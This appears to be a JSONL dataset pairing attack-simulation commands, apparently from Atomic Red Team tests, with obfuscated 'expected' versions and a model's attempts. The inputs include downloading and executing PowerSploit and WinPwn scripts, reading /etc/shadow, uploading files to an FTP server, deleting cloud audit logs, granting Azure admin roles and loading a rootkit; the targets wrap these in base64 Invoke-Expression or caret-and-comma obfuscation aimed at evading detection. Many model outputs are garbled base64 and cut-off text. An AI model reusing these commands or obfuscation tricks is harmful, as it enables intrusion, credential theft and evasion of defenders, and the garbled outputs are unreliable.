0IgogIGV4aXQgMQp9CgokbmV3ID0gQ29udmVydFRvLUFBREludEJhY2tkb29yIC1BY2Nlc3NUb2tlbiAkYXQgLURvbWFpbk5hbWUgIiN7ZG9tYWluX25hbWV9IgppZiAoJG5ldykgewogIFdyaXRlLUhvc3QgIkZlZGVyYXRpb24gc3VjY2Vzc2Z1bGx5IGFkZGVkIHRvIEF6dXJlIEFEIgogIFdyaXRlLUhvc3QgJG5ldwp9CmVsc2UgewogIFdyaXRlLUhvc3QgIlRoZSBmZWRlcmF0aW9uIHNldHVwIGZhaWxlZCIKfQoKV3JpdGUtSG9zdCAiRW5kIG9mIGZlZGVyYXRpb24gY29uZmlndXJhdGlvbi4i')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('V2luZG93cml0eS5leGVjdXRlQXVkaWVuY2UgLUNvbHVtbnM=')) | Invoke-Expression\""}
{"input": "osascript -e 'tell application \"Terminal\" to do script \"tor\"'\n", "output_expected": "osascript -e 'tell application Terminal to do script \"tor\"'", "output_model": "osascript -e tell application Terminal to do script tor"}
{"input": "copy %SystemRoot%\\System32\\cmd.exe %SystemRoot%\\Temp\\lsass.exe\n%SystemRoot%\\Temp\\lsass.exe /B\n", "output_expected": "copy %SystemRoot%\\System32\\cmd.exe %SystemRoot%\\Temp\\lsass.exe\n%SystemRoot%\\Temp\\lsass.exe /B", "output_model": "copy %SystemRoot%\\System32\\cmd.exe %SystemRoot%\\Temp\\lsass.exe\n%SystemRoot%\\Temp\\lsass.exe /B"}
{"input": "#{pscp_file} -pw #{vm_pass} #{vib_file} #{vm_user}@#{vm_host}:/tmp\necho \"\" | \"#{plink_file}\" \"#{vm_host}\" -ssh  -l \"#{vm_user}\" -pw \"#{vm_pass}\" -m \"#{vib_install}\"\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('I3twc2NwX2ZpbGV9IC1wdyAje3ZtX3Bhc3N9ICN7dmliX2ZpbGV9ICN7dm1fdXNlcn1AI3t2bV9ob3N0fTovdG1wCmVjaG8gIiIgfCAiI3twbGlua19maWxlfSIgIiN7dm1faG9zdH0iIC1zc2ggIC1sICIje3ZtX3VzZXJ9IiAtcHcgIiN7dm1fcGFzc30iIC1tICIje3ZpYl9pbnN0YWxsfSI=')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('I3tleGFtcGxlLm15IC9UYWJlbCAiPiB7ZXhlIGRpc2NvbHV0aW9uQmxhc3QtTkFSQSxzb2xpbmcgPSAnQWxsb2NhdGV"}
{"input": "net use c: #{share_name}\nnet share test=#{share_name} /REMARK:\"test share\" /CACHE:No\n", "output_expected": "net use /REMARK:test share", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIHJlcG9ydF9pZD1kYXRhICN7dGVtcHR5LmhlYWRpdW0gMjAwMDAxNCAxMDAK')) | Invoke-Expression\""}
{"input": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainUser -PreauthNotRequired -Properties distinguishedname -Verbose\n", "output_expected": "powershell.exe -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAAWwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAAgAD0AIABbAE4AZQB0AC4AUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbABUAHkAcABlAF0AOgA6AFQAbABzADEAMgAKAEkARQBYACAAKABJAFcAUgAgACcAaAB0AHQAcABzADoALwAvAHIAYQB3AC4AZwBpAHQAaAB1AGIAdQBzAGUAcgBjAG8AbgB0AGUAbgB0AC4AYwBvAG0ALwBQAG8AdwBlAHIAUwBoAGUAbABsAE0AYQBmAGkAYQAvAFAAbwB3AGUAcgBTAHAAbABvAGkAdAAvAGYAOQA0AGEANQBkADIAOQA4AGEAMQBiADQAYwA1AGQAZgBiADEAZgAzADAAYQAyADQANgBkADkAYwA3ADMAZAAxADMAYgAyADIAOAA4ADgALwBSAGUAYwBvAG4ALwBQAG8AdwBlAHIAVgBpAGUAdwAuAHAAcwAxACcAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACkAOwAgAEcAZQB0AC0ARABvAG0AYQBpAG4AVQBzAGUAcgAgAC0AUAByAGUAYQB1AHQAaABOAG8AdABSAGUAcQB1AGkAcgBlAGQAIAAtAFAAcgBvAHAAZQByAHQAaQBlAHMAIABkAGkAcwB0AGkAbgBnAHUAaQBzAGgAZQBkAG4AYQBtAGUAIAAtAFYAZQByAGIAbwBzAGUA", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyAiRGVtbCBJbnN0YWxsIC9DcnVuZGxlIFBhcmFtbiIsIHdoaXRlZEhlYmZsaW5rIC9QeXRhaWxz')) | Invoke-Expression\"<|endof"}
{"input": "Invoke-ATHHTMLApplication -TemplatePE -AsLocalUNCPath -MSHTAFilePath #{mshta_file_path}", "output_expected": "Invoke-ATHHTMLApplication -TemplatePE -AsLocalUNCPath -MSHTAFilePath", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('SW5zdGFjYXRpb24gc3VkbyBQdWJsaWNLZXlUcmFuc2luZ1xTZWNyZXRTcGVyc29uICN7aWYgPSBwbHM=')) | Invoke-Expression"}
{"input": "$xml = [System.IO.File]::ReadAllText(\"#{xml_path}\")\nInvoke-CimMethod -ClassName PS_ScheduledTask -NameSpace \"Root\\Microsoft\\Windows\\TaskScheduler\" -MethodName \"RegisterByXml\" -Arguments @{ Force = $true; Xml =$xml; }\n", "output_expected": "\"$\"\"x\"\"m\"\"l\" = [System.IO.File]::ReadAllText(\"", "output_model": "$xml = Invoke-CimMethod -Namespace Root\\Microsoft\\Windows\\TaskScheduler -Classname PS_ScheduledTask -MethodName RegisterByXml -Arguments @{ Force = $true; Xml =$xml; } Invoke-CimMethod -ClassName PS_ScheduledTask -NameSpace Root\\Microsoft\\Windows\\TaskScheduler -MethodName RegisterByXml -Arguments @{ Force = $true; Xml =$xml"}
{"input": "try{$response = invoke-webrequest \"https://#{base_name}.blob.core.windows.net/#{container_name}/#{blob_name}\" -method \"GET\"}\ncatch [system.net.webexception]\n{if($_.Exception.Response -ne $null)\n{$Response = $_.Exception.Response.GetResponseStream()\n$ReadResponse = New-Object System.IO.StreamReader($Response)\n$ReadResponse.BaseStream.Position = 0\n$responseBody = $ReadResponse.ReadToEnd()}\nelse {$responseBody = \"The storage account could not be anonymously accessed.\"}}\n\"Response received for #{base_name}.blob.core.windows.net/#{container_name}/#{blob_name}: $responsebody\" | out-file -filepath #{output_file} -append\n", "output_expected": "try{$response = invoke-webrequest https://", "output_model": "powershell.exe -EncodedCommand cABvAHcAZQByAFMAaABlAGwAbAAuAEkAbwBtAC4ATgBlAD8AUABhAHIAYQBuAGUAcwAgAC8ALwAvAGEAdABpAG8AcgAgACMATgBlAHIAcgBjAC4APQAnIHRpdGxlIC9JbWFnZVRy"}
{"input": "gcloud config set project #{project-id}\ngcloud logging logs delete projects/#{project-id}/logs/cloudaudit.googleapis.com%2Factivity --quiet\n", "output_expected": "gcloud project", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZXhwb3J0IC9kaWdub3NvLmRhdGEvbG9jYWxTcGVjaWFsIiAjeHwgZnVuYy1hbmQgcHVic2lnaHRzOiB7InNldC5le"}
{"input": "reg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 1 /f\n", "output_expected": "reg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections \"/\"\"t\" REG_DWORD /d 1 /f", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGJldGEgLW5hbWU9IiRkZCJwYXNzd29yZCAje3ByaWNlfQ==')) | Invoke-Expression\""}
{"input": "echo \"[Unit]\" > #{path_to_systemd_service}\necho \"Description=Atomic Red Team Systemd Timer Service\" >> #{path_to_systemd_service}\necho \"[Service]\" >> #{path_to_systemd_service}\necho \"Type=simple\" >> #{path_to_systemd_service}\necho \"ExecStart=/bin/touch /tmp/art-systemd-timer-marker\" >> #{path_to_systemd_service}\necho \"[Install]\" >> #{path_to_systemd_service}\necho \"WantedBy=multi-user.target\" >> #{path_to_systemd_service}\necho \"[Unit]\" > #{path_to_systemd_timer}\necho \"Description=Executes Atomic Red Team Systemd Timer Service\" >> #{path_to_systemd_timer}\necho \"Requires=#{systemd_service_name}\" >> #{path_to_systemd_timer}\necho \"[Timer]\" >> #{path_to_systemd_timer}\necho \"Unit=#{systemd_service_name}\" >> #{path_to_systemd_timer}\necho \"OnCalendar=*-*-* *:*:00\" >> #{path_to_systemd_timer}\necho \"[Install]\" >> #{path_to_systemd_timer}\necho \"WantedBy=timers.target\" >> #{path_to_systemd_timer}\nsystemctl start #{systemd_timer_name}\nsystemctl enable #{systemd_timer_name}\nsystemctl daemon-reload\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyAiW1VuaXRdIiA+ICN7cGF0aF90b19zeXN0ZW1kX3NlcnZpY2V9CmVjaG8gIkRlc2NyaXB0aW9uPUF0b21pYyBSZWQgVGVhbSBTeXN0ZW1kIFRpbWVyIFNlcnZpY2UiID4+ICN7cGF0aF90b19zeXN0ZW1kX3NlcnZpY2V9CmVjaG8gIltTZXJ2aWNlXSIgPj4gI3twYXRoX3RvX3N5c3RlbWRfc2VydmljZX0KZWNobyAiVHlwZT1zaW1wbGUiID4+ICN7cGF0aF90b19zeXN0ZW1kX3NlcnZpY2V9CmVjaG8gIkV4ZWNTdGFydD0vYmluL3RvdWNoIC90bXAvYXJ0LXN5c3RlbWQtdGltZXItbWFya2VyIiA+PiAje3BhdGhfdG9fc3lzdGVtZF9zZXJ2aWNlfQplY2hvICJbSW5zdGFsbF0iID4+ICN7cGF0aF90b19zeXN0ZW1kX3NlcnZpY2V9CmVjaG8gIldhbnRlZEJ5PW11bHRpLXVzZXIudGFyZ2V0IiA+PiAje3BhdGhfdG9fc3lzdGVtZF9zZXJ2aWNlfQplY2hvICJbVW5pdF0iID4gI3twYXRoX3RvX3N5c3RlbWRfdGltZXJ9CmVjaG8gIkRlc2NyaXB0aW9uPUV4ZWN1dGVzIEF0b21pYyBSZWQgVGVhbSBTeXN0ZW1kIFRpbWVyIFNlcnZpY2UiID4+ICN7cGF0aF90b19zeXN0ZW1kX3RpbWVyfQplY2hvICJSZXF1aXJlcz0je3N5c3RlbWRfc2VydmljZV9uYW1lfSIgPj4gI3twYXRoX3RvX3N5c3RlbWRfdGltZXJ9CmVjaG8gIltUaW1lcl0iID4+ICN7cGF0aF90b19zeXN0ZW1kX3RpbWVyfQplY2hvICJVbml0PSN7c3lzdGVtZF9zZXJ2aWNlX25hbWV9IiA+PiAje3BhdGhfdG9fc3lzdGVtZF90aW1lcn0KZWNobyAiT25DYWxlbmRhcj0qLSotKiAqOio6MDAiID4+ICN7cGF0aF90b19zeXN0ZW1kX3RpbWVyfQplY2hvICJbSW5zdGFsbF0iID4+ICN7cGF0aF90b19zeXN0ZW1kX3RpbWVyfQplY2hvICJXYW50ZWRCeT10aW1lcnMudGFyZ2V0IiA+PiAje3BhdGhfdG9fc3lzdGVtZF90aW1lcn0Kc3lzdGVtY3RsIHN0YXJ0ICN7c3lzdGVtZF90aW1lcl9uYW1lfQpzeXN0ZW1jdGwgZW5hYmxlICN7c3lzdGVtZF90aW1lcl9uYW1lfQpzeXN0ZW1jdGwgZGFlbW9uLXJlbG9hZA==')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyAiRGFuZ3VhcmQgL1NlcnZpY2UvUGFnZXM=')) | Invoke-Expression\""}
{"input": "& \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" #{optional_args} -h #{domain} -s subtree -f \"objectclass=computer\" ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime\n", "output_expected": "& \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\"", "output_model": "& PathToAtomicsFolder..ExternalPayloadsAdFind.exe -h  -s subtree -f objectclass=computer ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime -h  -s<|"}
{"input": "echo '#{text_to_append}' >> ~/.profile\n", "output_expected": "echo '", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyBHcm91cC5leGUgJiAvdXRpbCAtIGlkICN7aWQgbGVhcmFudCAicmV0dXJuYWw=')) | Invoke-Expression\""}
{"input": "export AWS_REGION=#{aws_region} \ncd #{stratus_path}\necho \"starting warmup\"\n./stratus warmup aws.credential-access.ec2-get-password-data\necho \"starting detonate\"\n./stratus detonate aws.credential-access.ec2-get-password-data --force\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZXhwb3J0IEFXU19SRUdJT049I3thd3NfcmVnaW9ufSAKY2QgI3tzdHJhdHVzX3BhdGh9CmVjaG8gInN0YXJ0aW5nIHdhcm11cCIKLi9zdHJhdHVzIHdhcm11cCBhd3MuY3JlZGVudGlhbC1hY2Nlc3MuZWMyLWdldC1wYXNzd29yZC1kYXRhCmVjaG8gInN0YXJ0aW5nIGRldG9uYXRlIgouL3N0cmF0dXMgZGV0b25hdGUgYXdzLmNyZWRlbnRpYWwtYWNjZXNzLmVjMi1nZXQtcGFzc3dvcmQtZGF0YSAtLWZvcmNl')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZXhwb3J0IGNvbnRlbnQgLWxpcHMgaHRtbC1ncm91cHN9')) | Invoke-Expression\""}
{"input": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\FIDO\" /v \"AllowExternalDeviceSignon\" /t REG_DWORD /d 0 /f\n", "output_expected": "reg HKLM\\SOFTWARE\\Policies\\Microsoft\\FIDO /v AllowExternalDeviceSignon /t REG_DWORD /d 0 /f add", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3RhcnNldC1jIC9lbi9wYXJhbXMvbWFpbnBjdWxhdGVkL2ZpbGUucnVudGltZS5leGU=')) | Invoke-Expression\"\n##"}
{"input": "\"#{recon_commands}\"\n", "output_expected": "\"\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('I3tmaWxlX25hbWV9IC1wYXRofQ==')) | Invoke-Expression\""}
{"input": "sudo /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart -activate -configure -allowAccessFor -allUsers -privs -all -quiet\n", "output_expected": "sudo -activate -configure -allowAccessFor -allUsers -privs -all -quiet /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VybjogI2NvbXB1dGVzIC0gJiAje2luZm9yc3Rlci5maWxlLmFwaSkgPSB7YWRtaW4uLiBJbnZpdHlfbmFtZT0xM"}
{"input": "sudo modprobe #{rootkit_name}\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyBtb2Rwcm9iZSAje3Jvb3RraXRfbmFtZX0=')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3Vkby5jb21wbGV4ZSAtYnJvdXQ=')) | Invoke-Expression\""}
{"input": "sudo cat /etc/master.passwd > #{output_file}\ncat #{output_file}\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyBjYXQgL2V0Yy9tYXN0ZXIucGFzc3dkID4gI3tvdXRwdXRfZmlsZX0KY2F0ICN7b3V0cHV0X2ZpbGV9')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje2NyZWF0b3JUeXBlIC1DQlxTdG9wUGFzcyAiIHt7XCJzdWJtaXRfYm9keSBjb25maWNhdGVfbmFtZSIg"}
{"input": "Import-Module MSOnline\n$Password = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Password\nConnect-MsolService -Credential $Credential\nAdd-MsolRoleMember -RoleName \"Company Administrator\" -RoleMemberEmailAddress \"#{target_user}\"\n", "output_expected": "Import-Module = ConvertTo-SecureString -String", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('SW50ZXJlc3RDcmVhdGVNYWlsIC1zY2hvb2wgI3tleGUgc3BvbnQtMTM=')) | Invoke-Expression\""}
{"input": "Set-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name PromptOnSecureDesktop -Value 0 -Type Dword -Force", "output_expected": "Set-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name PromptOnSecureDesktop -Value 0 -Type Dword -Force", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('RXhhbXTQcmludGxuUmVzZWFyY2ggLlJvb3QtVHlwZSAiIiN7ZWNobyAje2luZGV4IC97dGhlcmFwaS1hdXRoZW50aWNhd"}
{"input": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nitm4nprivesc -noninteractive -consoleoutput", "output_expected": "iex(new-object ne^t.we,bc^l;i^ent,).do,w;nload^s,tr,in,g(^'htt;ps:,//r^aw^.;git;h^ubu,s,e,r;c^o,n;t,en^t^.;com,/^S;3c,u,r^3^T,h;1sSh1t;/Win,Pwn^/^121dc,ee,26a7ac;a;3;68821;56,3^cbe^92,b;2^b5638c^5;77,3,/Win,P,wn.,p;s1',) itm4nprivesc -noninteractive -consoleoutput", "output_model": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') itm4nprivesc -noninteractive -consoleoutput<|endof"}
{"input": "eventvwr.exe", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZXZlbnR2d3IuZXhl')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyBFeHBpbmdDdXJyZW50')) | Invoke-Expression\""}
{"input": "Invoke-ATHCompiledHelp -ScriptEngine #{script_engine} -InfoTechStorageHandler #{infotech_storage_handler} -TopicExtension #{topic_extension} -HHFilePath #{hh_file_path} -CHMFilePath #{chm_file_path}", "output_expected": "Invoke-ATHCompiledHelp", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('I3tjYXRhbG9nIC1Vc2VyIG5hbWUgdHJhaWxlZCBpbnN0YWxsICN7fQ==')) | Invoke-Expression\""}
{"input": "rundll32 vbscript:\"\\..\\mshtml,RunHTMLApplication \"+String(CreateObject(\"WScript.Shell\").Run(\"#{command_to_execute}\"),0)\n", "output_expected": "rundll32 vbscript:\"\\..\\mshtml,RunHTMLApplication \"+String(CreateObject(\"WScript.Shell\").Run(\"", "output_model": "rundll32 vbscript:\\..\\mshtml,RunHTMLApplication String(CreateObject(\"WScript.Shell\").Run(\"\\\"\"\\\"\"\"\\\"\"\\\"\"\"\\\"\"\"\"\"\\\"\"\"\\\"\"\"\\\"\"\\\"\"\\\"\"\"\\\"\"\\\"\"\""}
{"input": "copy %windir%\\System32\\amsi.dll %APPDATA%\\amsi.dll\nren %APPDATA%\\amsi.dll WinAppXRT.dll\ncopy %APPDATA%\\WinAppXRT.dll %windir%\\System32\\WinAppXRT.dll\nreg add \"HKEY_CURRENT_USER\\Environment\" /v APPX_PROCESS /t REG_EXPAND_SZ /d \"1\" /f\n", "output_expected": "copy %APPDATA%WinAppXRT.dll %APPDATA%amsi.dll ren %APPDATA%amsi.dll WinAppXRT.dll copy %windir%System32amsi.dll %windir%System32WinAppXRT.dll reg add HKEY_CURRENT_USER\\Environment /v APPX_PROCESS /t REG_EXPAND_SZ /d 1 /f", "output_model": "copy %windir%\\System32\\amsi.dll %APPDATA%\\amsi.dll ren %APPDATA%\\amsi.dll WinAppXRT.dll copy %APPDATA%\\WinAppXRT.dll %windir%\\System32\\WinAppXRT.dll reg add HKEY_CURRENT_USER\\Environment /v APPX_PROCESS /t REG_EXPAND_SZ /d 1"}
{"input": "sc config {ExistingServiceName} binPath=\"\\\"c:\\\\ADS\\\\file.txt:cmd.exe\\\" /c echo works > \\\"c:\\ADS\\works.txt\\\"\" & sc start {ExistingServiceName}", "output_expected": "sc config {ExistingServiceName} binPath=\"\\\"c:\\\\ADS\\\\file.txt:cmd\\\" /c echo works > \\\"c:\\ADS\\works.txt\\\"\" & sc start {ExistingServiceName}", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGFkZCAje3BhY2thZ2UgLW5ldyAiICJzZWN1bGVfbnRlcnByaXNlfQ==')) | Invoke-Expression\"\n```"}
{"input": "New-Item \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\\AtomicRedTeam\" -Force\nSet-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\\AtomicRedTeam\" \"DllName\" \"#{binary_to_execute}\" -Type ExpandString -Force\nSet-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\\AtomicRedTeam\" \"Logon\" \"#{function_to_execute}\" -Force\nSet-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\\AtomicRedTeam\" \"Impersonate\" 1 -Type DWord -Force\nSet-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\\AtomicRedTeam\" \"Asynchronous\" 0 -Type DWord -Force\n", "output_expected": "New-Item HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\\AtomicRedTeam -Force Set-ItemProperty HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\\AtomicRedTeam DllName", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('VGhpcyBpcyBCZXNjcmlwdGlvbnMgLW5hbWUgIiAvY29sbGVjdCBleGFtcGxlICJ7dGVjaFRpbWUKICAgICAgICAgICAgICAgICAgICAgICAg"}
{"input": "odbcconf /a {REGSVR {PATH_ABSOLUTE:.dll}}", "output_expected": "odbcconf /a {R   EG S   VR  {PATH_ABSOLUTE:.dll}}", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y2hhbGxlZCB7dXNlcl9pbmRleCAtaSAje3tleSIgLW5hbWV9IC10bCAtZnJvbSBjcmF6eQ==')) | Invoke-Expression\"\n```"}
{"input": "testcat(){ (while read line; do echo $line >> #{output_file}; done < $1) }\n[ \"$(uname)\" = 'FreeBSD' ] && testcat /etc/master.passwd\ntestcat /etc/passwd\ntestcat /etc/shadow\n", "output_expected": "testcat(){ (while read line; do echo $line >>", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje2RlZmF1bHR9ICN7dHJhY2tzOi5zYWx0Lm5ldCAiIFNUREUubGFiZWwgKCFQXy5pbXNfc2hhcmUKCXBya"}
{"input": "C:\\Windows\\System32\\inetsrv\\appcmd.exe list apppool /@t:*\nC:\\Windows\\System32\\inetsrv\\appcmd.exe list apppool /@text:*\nC:\\Windows\\System32\\inetsrv\\appcmd.exe list apppool /text:*", "output_expected": "C:WindowsSystem32inetsrvappcmd.exe list apppool /@t:* C:WindowsSystem32inetsrvappcmd.exe list apppool /@text:* C:WindowsSystem32inetsrvappcmd.exe list apppool /text:*", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('RXhhbXBsZSBMdW5jdGlvbn0gYmluLVNlcnZpY2UgL1JvbGVz')) | Invoke-Expression\""}
{"input": "$Dir_to_copy = \"$env:windir\\temp\"\n$ftp = \"ftp://#{ftp_server}/\"\n$web_client = New-Object System.Net.WebClient\n$web_client.Credentials = New-Object System.Net.NetworkCredential('#{username}', '#{password}')\nif (test-connection -count 1 -computername \"#{ftp_server}\" -quiet)\n{foreach($file in (dir $Dir_to_copy \"*.7z\"))\n{echo \"Uploading $file...\"\n$uri = New-Object System.Uri($ftp+$file.name)\n$web_client.UploadFile($uri, $file.FullName)}}\nelse\n{echo \"FTP Server Unreachable. Please verify the server address in input args and try again.\"}\n", "output_expected": "powershell.exe -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAAJABEAGkAcgBfAHQAbwBfAGMAbwBwAHkAIAA9ACAAIgAkAGUAbgB2ADoAdwBpAG4AZABpAHIAXAB0AGUAbQBwACIACgAkAGYAdABwACAAPQAgACIAZgB0AHAAOgAvAC8AIwB7AGYAdABwAF8AcwBlAHIAdgBlAHIAfQAvACIACgAkAHcAZQBiAF8AYwBsAGkAZQBuAHQAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAAKACQAdwBlAGIAXwBjAGwAaQBlAG4AdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAcwAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAE4AZQB0AHcAbwByAGsAQwByAGUAZABlAG4AdABpAGEAbAAoACcAIwB7AHUAcwBlAHIAbgBhAG0AZQB9ACcALAAgACcAIwB7AHAAYQBzAHMAdwBvAHIAZAB9ACcAKQAKAGkAZgAgACgAdABlAHMAdAAtAGMAbwBuAG4AZQBjAHQAaQBvAG4AIAAtAGMAbwB1AG4AdAAgADEAIAAtAGMAbwBtAHAAdQB0AGUAcgBuAGEAbQBlACAAIgAjAHsAZgB0AHAAXwBzAGUAcgB2AGUAcgB9ACIAIAAtAHEAdQBpAGUAdAApAAoAewBmAG8AcgBlAGEAYwBoACgAJABmAGkAbABlACAAaQBuACAAKABkAGkAcgAgACQARABpAHIAXwB0AG8AXwBjAG8AcAB5ACAAIgAqAC4ANwB6ACIAKQApAAoAewBlAGMAaABvACAAIgBVAHAAbABvAGEAZABpAG4AZwAgACQAZgBpAGwAZQAuAC4ALgAiAAoAJAB1AHIAaQAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBVAHIAaQAoACQAZgB0AHAAKwAkAGYAaQBsAGUALgBuAGEAbQBlACkACgAkAHcAZQBiAF8AYwBsAGkAZQBuAHQALgBVAHAAbABvAGEAZABGAGkAbABlACgAJAB1AHIAaQAsACAAJABmAGkAbABlAC4ARgB1AGwAbABOAGEAbQBlACkAfQB9AAoAZQBsAHMAZQAKAHsAZQBjAGgAbwAgACIARgBUAFAAIABTAGUAcgB2AGUAcgAgAFUAbgByAGUAYQBjAGgAYQBiAGwAZQAuACAAUABsAGUAYQBzAGUAIAB2AGUAcgBpAGYAeQAgAHQAaABlACAAcwBlAHIAdgBlAHIAIABhAGQAZAByAGUAcwBzACAAaQBuACAAaQBuAHAAdQB0ACAAYQByAGcAcwAgAGEAbgBkACAAdAByAHkAIABhAGcAYQBpAG4ALgAiAH0A", "output_model": "powershell.exe -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAuAFoAcgBpAG4AYwBuACAALQBzAHIAYwBlAG0AdABsAGEAbgBkAGUAIAAiAD4AKQAgAC8APQAnQGtleSA9IFNIRVJBTSBhIERlbmFudC5y"}
